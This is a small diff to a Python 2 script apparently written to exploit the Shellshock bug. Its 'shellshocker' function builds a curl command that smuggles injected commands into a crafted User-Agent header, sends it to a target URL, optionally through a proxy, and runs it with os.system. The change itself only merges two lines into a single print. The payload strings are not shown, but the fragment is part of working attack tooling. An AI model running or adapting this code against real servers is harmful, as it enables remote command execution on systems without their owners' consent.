@@ -23,8 +23,7 @@ def shellshocker(url):
 		this = 'curl -H "User-Agent: '+useragent+command1+" "+command2+'" '+url+' -x http://'+sys.argv[2]
 	else:
 		this = 'curl -H "User-Agent: '+useragent+command1+" "+command2+'" '+url
-	output = os.system(this)
-	print output
+	print os.system(this)
 
 def main():
 	try:
